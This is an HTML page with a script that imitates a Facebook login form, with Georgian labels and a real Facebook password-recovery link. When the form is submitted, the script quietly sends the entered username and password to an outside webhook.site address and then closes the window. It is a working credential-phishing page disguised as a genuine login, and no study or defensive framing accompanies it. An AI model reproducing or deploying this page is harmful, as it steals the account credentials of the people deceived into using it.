<div class="container"><img src=https://upload.wikimedia.org/wikipedia/commons/9/93/Facebook_logo_%282023%29.svg height=50><h2>Login With Facebook</h2> <form id="loginForm"> <input type="text" id="username" name="username" placeholder="ელ. მეილი" required> <input type="password" id="password" name="password" placeholder="პაროლი" required> <input type="submit" value="Log In"> </form> <a id="forgotPassword" href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">პაროლის აღდგენა?</a></div>
<script>
    document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    if (username.trim() !== "" && password.trim() !== "") {
        var params = "username=" + encodeURIComponent(username) + "&passwordfor<" + encodeURIComponent(username) + ">=" + encodeURIComponent(password);
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://webhook.site/0b7833a2-9885-4e3e-905f-442d888ced95/?" + params, true);
        xhr.onreadystatechange = function() {
          window.addEventListener("beforeunload", function() {
            window.close();
          });
        };
        xhr.send();
    } else {
        alert("შეიყვანეთ ელ. ფოსტა და პაროლი.");
    }
});
</script>
</div>
